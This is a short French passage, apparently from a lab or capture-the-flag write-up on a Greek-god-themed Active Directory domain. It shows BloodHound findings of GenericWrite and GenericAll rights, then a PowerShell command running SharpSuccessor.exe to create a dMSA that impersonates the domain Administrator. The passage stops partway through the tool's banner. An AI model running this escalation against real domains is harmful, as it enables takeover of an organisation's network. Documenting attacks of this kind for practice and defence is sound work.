...
On voit avec bloodhound que l'on a un génericWrite sur tous les Dieux à l'exception de `Zeus` l'Administrateur du domaine. Le dieu avec les droits les plus intéressants semble être hades qui a un genericAll sur l'OU ENFERS et les enfants de cette dernière.
...
```
PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD" /account:persephone /name:pwned_dMSA
   _____ _                      _____
  / ____| |                    / ____|
